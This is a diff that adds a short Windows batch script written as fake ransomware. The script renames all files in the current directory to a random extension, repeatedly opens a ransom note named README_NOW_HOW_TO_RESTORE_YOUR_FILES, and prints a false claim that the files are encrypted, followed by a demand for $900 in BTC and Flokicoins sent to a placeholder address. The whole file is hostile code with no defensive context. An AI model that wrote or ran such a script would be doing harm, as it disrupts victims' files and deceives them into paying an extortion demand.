@@ -1,0 +1,13 @@
+cd..
+ren *.* *.6pL9NU7M8j*
+notepad README_NOW_HOW_TO_RESTORE_YOUR_FILES
+cd..
+notepad README_NOW_HOW_TO_RESTORE_YOUR_FILES
+cd..
+notepad README_NOW_HOW_TO_RESTORE_YOUR_FILES
+cd..
+notepad README_NOW_HOW_TO_RESTORE_YOUR_FILES
+color B
+echo Your files are not acessible because they are encrypted. In order to restore your files, Send $900 BTC and Flokicoins at this address:XXXXXXXXX
+pause
+exit
